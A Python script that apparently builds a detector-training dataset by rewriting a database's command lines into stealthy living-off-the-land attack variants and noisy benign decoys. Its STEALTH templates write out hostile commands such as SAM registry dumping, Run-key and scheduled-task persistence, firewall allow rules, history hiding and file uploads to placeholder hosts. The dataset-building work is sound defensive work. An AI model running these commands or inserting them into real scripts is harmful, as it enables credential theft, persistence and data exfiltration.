#!/usr/bin/env python3
"""
transform_command_pool.py

Rewrite ONLY the ``command_line`` column of the live ``command_pool`` table into a
harder *adversarial-robustness* dataset for the AttackGen CTF train/score loop:

* hard negatives — ``label='malicious'`` rows re-expressed as stealthy LOLBin/mimicry
  variants (trusted binaries, benign-looking filenames, mundane paths);
* hard positives — ``label='benign'`` rows wrapped in noisy/complex pipelines (deep
  paths, ``| && ;``, env vars, a harmless base64 echo blob) so naive keyword/regex
  scanners over-flag them.

Guardrails (see plan):
  1. Only ``command_line`` changes; id/process_name/label/attack_type are read-only.
  2. Labels stay honest — malicious stays malicious.
  3. Documented-pattern level only — NO working payloads, NO real C2 endpoints, NO
     functional encryption. Inert markers/placeholders and internal-looking hosts.
  4. Reversible — snapshot to ``command_pool_orig`` before any UPDATE.
  5. Both classes of an attack_type share the same structural wrapper (hard samples).

Selection/escaping: psycopg v3, parameterized ``%s`` UPDATE (safe quote/backslash
handling — no hand-escaping). Rows are inert text; nothing here executes a command.
"""

from __future__ import annotations

import os
import random

import generate_command_pool as g  # reuse curated pools/helpers (import is side-effect-safe)

DSN = os.environ.get("DATABASE_URL", "postgresql://iddocohen@localhost:5432/attackgen")
SEED = 20240611
BATCH = 1000

rng = random.Random(SEED)

# --- inert content pools ---------------------------------------------------- #
BENIGN_FNAMES = [
    "chrome_updater", "sys_policy", "telemetry_flush", "onedrive_sync", "defender_scan",
    "update_check", "health_probe", "cache_warmer", "gpupdate_helper", "vendor_agent",
    "metrics_rollup", "log_shipper",
]
MUNDANE_WIN = [
    r"%LOCALAPPDATA%\Temp", r"%APPDATA%\Microsoft\Windows", r"C:\ProgramData\Vendor\cache",
    r"%TEMP%", r"C:\Windows\Temp",
]
MUNDANE_POSIX = [
    "/var/tmp", "/tmp/.cache", "$HOME/.cache", "/var/lib/vendor/cache", "/opt/vendor/spool",
]
# base64 of these decodes to harmless telemetry strings only
BENIGN_ECHO = [
    "telemetry ping ok", "update check complete", "health probe 200",
    "cache warm done", "policy sync ok", "heartbeat 30s",
]

# Per-attack_type stealth "cores" (args appended after the row's own process_name).
# Deliberately inert/documented-pattern: benign filenames, mundane paths, internal
# hosts, benchmarks/connectivity-checks, PLACEHOLDER where a payload would sit.
STEALTH = {
    "ransomware": [
        "-czf {lpath}/{bfname}.tar.gz {lpath}/staging --warning=no-file-changed",
        "--quiet enc -aes-256-cbc -in {lpath}/{bfname}.tmp -out {lpath}/{bfname}.bak -pass pass:PLACEHOLDER",
        "-a -bsp0 -bso0 {lpath}/{bfname}.7z {lpath}/staging",
    ],
    "lateral_movement": [
        "/node:{host} process call create \"{bfname}.exe /silent\"",
        "-ComputerName {host} -ScriptBlock {{ Get-Service {svc} }}",
        "{user}@{host} \"systemctl status {svc} --no-pager\"",
    ],
    "persistence": [
        "/create /tn \"{task}\" /tr \"{lpath}\\{bfname}.exe /silent\" /sc daily /st 03:00 /f",
        "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {bfname} /t REG_SZ /d \"{lpath}\\{bfname}.exe\" /f",
        "-c \"@reboot {user} {lpath}/{bfname} --quiet\"",
    ],
    "credential_dumping": [
        "save HKLM\\SAM {lpath}\\{bfname}.dat /y",
        "-Command \"Copy-Item '{lpath}\\creds.marker' '{lpath}\\{bfname}.bak'\"",
        "/y /vss {lpath}\\{bfname}.tmp",
    ],
    "reverse_shell": [  # inert connectivity checks ONLY — no interactive shell pipe
        "-s -o {lpath}/{bfname}.log https://{host}/health",
        "-NoProfile -Command \"Test-NetConnection {host} -Port 443\"",
        "-w 2 {host} 443 < /dev/null",
    ],
    "data_exfiltration": [
        "-s -T {lpath}/{bfname}.log https://{host}/upload",
        "-az --bwlimit=2000 {lpath}/{bfname} backup@{host}:/spool/",
        "-urlcache -split -f https://{host}/{bfname} {lpath}\\{bfname}.tmp",
    ],
    "sql_exploitation": [
        "-S {host} -E -Q \"BACKUP DATABASE telemetry TO DISK='{lpath}\\{bfname}.bak'\"",
        "-h {host} -U {user} -c \"SELECT 1\"",
        "-c \"id >/dev/null\"",
    ],
    "crypto_miner": [  # benchmarks / capped, inert
        "--quiet --threads 2 --benchmark {lpath}/{bfname}.cfg",
        "-c \"nice -n 19 {bfname} --max-cpu 25 --config {lpath}/{bfname}.cfg\"",
        "run --rm --cpus 1 alpine true",
    ],
    "privilege_escalation": [
        "/user:{user} \"{bfname}.exe /silent\"",
        "-u {user} {lpath}/{bfname} --check",
        "-Command \"Start-Process '{lpath}\\{bfname}.exe' -Verb RunAs -ArgumentList '/silent'\"",
    ],
    "defense_evasion": [
        "advfirewall firewall add rule name=\"{bfname}\" dir=in action=allow program=\"{lpath}\\{bfname}.exe\"",
        "config {svc} start= demand",
        "-c \"export HISTFILE={lpath}/{bfname}.log\"",
    ],
    "_default": ["-q -o {lpath}/{bfname}.log"],
}


def _is_win(process_name: str) -> bool:
    return process_name.lower().endswith(".exe")


def _wrap(core: str, is_win: bool, lpath: str, bfname: str) -> str:
    """Identical structural skeleton for both classes (guardrail 5). Inert text."""
    blob = g.b64(rng.choice(BENIGN_ECHO))
    if is_win:
        return (
            f'cmd /c "set LOGDIR={lpath}& {core} 1> "%LOGDIR%\\{bfname}.log" 2>&1'
            f'& echo {blob}"'
        )
    return (
        f'bash -lc "cd {lpath} 2>/dev/null; {core} 2>&1 | tee -a {lpath}/{bfname}.log; '
        f'echo {blob} | base64 -d >/dev/null 2>&1"'
    )


def stealthify(process_name: str, attack_type: str) -> str:
    """Re-express a malicious row as a stealthy LOLBin variant (labeled malicious)."""
    is_win = _is_win(process_name)
    bfname = rng.choice(BENIGN_FNAMES)
    lpath = rng.choice(MUNDANE_WIN if is_win else MUNDANE_POSIX)
    ctx = dict(
        proc=process_name, bfname=bfname, lpath=lpath, hex=rng.choice(g.HEX),
        host=f"{rng.choice(g.HOSTS)}.{rng.choice(g.DOMAINS)}",
        task=rng.choice(g.TASKS), svc=rng.choice(g.SVCNAMES), user=rng.choice(g.USERS),
    )
    core = rng.choice(STEALTH.get(attack_type, STEALTH["_default"])).format(**ctx)
    return _wrap(f"{process_name} {core}", is_win, lpath, bfname)


def scarify(process_name: str, command_line: str) -> str:
    """Wrap an unchanged benign command in a noisy pipeline (labeled benign)."""
    is_win = _is_win(process_name)
    bfname = rng.choice(BENIGN_FNAMES)
    lpath = rng.choice(MUNDANE_WIN if is_win else MUNDANE_POSIX)
    return _wrap(command_line, is_win, lpath, bfname)


def transform(process_name: str, label: str, attack_type: str, command_line: str) -> str:
    if label == "malicious":
        return stealthify(process_name, attack_type)
    return scarify(process_name, command_line)


def main() -> None:
    import psycopg  # in the project's .venv

    with psycopg.connect(DSN) as conn:
        # 1. reversible backup (sibling table; command_pool schema untouched)
        with conn.cursor() as cur:
            cur.execute("CREATE TABLE IF NOT EXISTS command_pool_orig AS TABLE command_pool;")
            cur.execute("SELECT count(*) FROM command_pool_orig;")
            print(f"backup command_pool_orig rows: {cur.fetchone()[0]}")

            # 2. read
            cur.execute(
                "SELECT id, process_name, label, attack_type, command_line FROM command_pool"
            )
            rows = cur.fetchall()
        print(f"read {len(rows)} rows from command_pool")

        # 3. transform in Python
        updates = [
            (transform(pname, label, atype, cmd), rid)
            for (rid, pname, label, atype, cmd) in rows
        ]
        id2new = {rid: new for (new, rid) in updates}

        # 4. write back: parameterized, batched, commit per batch
        written = 0
        with conn.cursor() as cur:
            for i in range(0, len(updates), BATCH):
                chunk = updates[i : i + BATCH]
                cur.executemany(
                    "UPDATE command_pool SET command_line = %s WHERE id = %s", chunk
                )
                conn.commit()
                written += len(chunk)
        print(f"updated command_line for {written} rows")

    # 5. before/after samples (the values actually written)
    print("\n-- sample rewrites (as stored) --")
    shown = {"malicious": 0, "benign": 0}
    for (rid, pname, label, atype, cmd) in rows:
        if shown[label] >= 2:
            continue
        shown[label] += 1
        print(f"\n[{label}/{atype}] {pname}")
        print(f"  before: {cmd[:88]}")
        print(f"  after : {id2new[rid][:88]}")
        if all(v >= 2 for v in shown.values()):
            break


if __name__ == "__main__":
    main()
